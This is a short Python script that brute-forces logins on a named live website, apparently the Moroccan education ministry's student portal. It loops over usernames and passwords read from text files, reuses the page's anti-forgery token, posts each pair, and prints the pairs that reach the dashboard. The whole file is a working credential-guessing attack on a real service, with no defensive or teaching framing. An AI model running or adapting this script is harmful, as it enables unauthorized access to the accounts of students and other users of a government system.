import requests
from bs4 import BeautifulSoup

Target = "https://massarservice.men.gov.ma/moutamadris/Account"

def get_token(source):
    
    soup = BeautifulSoup(source, "html.parser")
    
    return soup.find('input', { "type" : "hidden" })['value']

with requests.Session() as s:
    
    src = s.get(Target).text

    user1 = open("user1.txt","r").read().split()

    pass2 = open("pass2.txt","r").read().split()

    for user_1 in user1 :

        for pass_2 in pass2 :
    
            data = {
                            
                "username" : user_1,
                            
                "password" : pass_2,
                            
                "login"    : "login",

                "__RequestVerificationToken" : get_token(src),
                            
                    }
            r = s.post(Target, data = data)
            
            if "/moutamadris/Dashboard" in r.url :
                print(user_1,"Find Password :",pass_2)
                break;
            elif "/moutamadris/Account" in r.url :
                print(user_1,"Error Password :",pass_2)
            
